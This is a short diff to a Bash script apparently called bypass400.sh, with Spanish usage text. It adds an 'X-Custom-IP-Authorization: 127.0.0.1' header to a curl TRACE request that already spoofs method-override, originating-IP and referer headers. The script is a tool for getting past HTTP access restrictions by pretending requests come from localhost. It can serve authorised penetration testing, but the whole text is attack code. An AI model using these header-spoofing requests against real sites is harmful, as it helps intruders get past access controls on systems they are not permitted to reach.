@@ -6,6 +6,7 @@ echo "Uso.: ./bypass400.sh https://url"
 echo
 # Otros metodos HTTP: -X ARBITRARY ACL TRACK, TRACE
 curl -k -s --http1.0 -vvv $1 -X "TRACE" \
+-H "X-Custom-IP-Authorization: 127.0.0.1" \
 -H "X-HTTP-Method-Override: ACL" \
 -H "Referer: $1" \
 -H "X-Originating-IP: $1" \
